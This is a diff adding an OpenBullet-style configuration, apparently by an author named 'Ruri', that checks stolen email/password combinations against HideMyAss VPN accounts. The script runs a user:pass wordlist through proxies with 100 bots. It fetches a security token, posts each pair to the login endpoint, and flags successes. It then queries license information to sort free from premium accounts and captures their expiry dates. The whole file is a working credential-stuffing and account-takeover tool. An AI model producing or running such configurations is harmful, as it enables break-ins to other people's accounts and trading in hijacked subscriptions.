@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "HMA",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-05T20:39:25.9704983+02:00",
+  "AdditionalInfo": "Captures Free/Premium",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_SEC_TOKEN REQUEST POST "https://id.hidemyass.com/service/single/MetaService/securityToken" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":1,\"operationName\":\"securityToken\",\"payload\":[],\"serviceName\":\"MetaService\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "PLAY_SESSION: 122bde6544e34a2ef6c40b8a4a819dd436261960-csrfToken=92dc04084468a540d48644d723d8c361ac82c5a5-1524934762071-5bfd2e1236939f2a7f1e6b10" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_SEC_TOKEN PARSE "<SOURCE>" JSON "operationResult" Recursive=FALSE -> VAR "SECTOKEN" "" "" 
+#LOGIN REQUEST POST "https://id.hidemyass.com/service/single/LoginService/login" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":5,\"operationName\":\"login\",\"payload\":[{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":false,\"captcha_response\":\"NOTREQUIRED\"},{\"allowAuthenticated\":true,\"extraLoginTicket\":false}],\"securityToken\":\"<SECTOKEN>\",\"serviceName\":\"LoginService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error.form.bad.credentials" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+#GET_USER_INFO REQUEST POST "https://my.hidemyass.com/LicenseController/licenseInfoList" AutoRedirect=TRUE 
+  CONTENT "{\"correlationId\":127,\"operationName\":\"licenseInfoList\",\"serviceName\":\"LicenseController\",\"payload\":[],\"securityToken\":\"<SECTOKEN>\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "SECURITY_TOKEN: <SECTOKEN>" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CHECK_IF_FREE KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "autoRenewal" 
+#PARSE_EXPIRATION PARSE "<SOURCE>" LR ",\"validTo\":" "," Recursive=FALSE -> VAR "EXP" "" "" 
+#CONVERT_MS_TO_S FUNCTION Compute "<EXP>/1000" -> VAR "EXP2" 
+#CONVERT_EXPIRATION FUNCTION UnixTimeToDate "<EXP2>" -> VAR "EXP3" 
+#CAPTURE_IT PARSE "<EXP3>" LR "" "" Recursive=FALSE -> CAP "Expiration" "" "" 
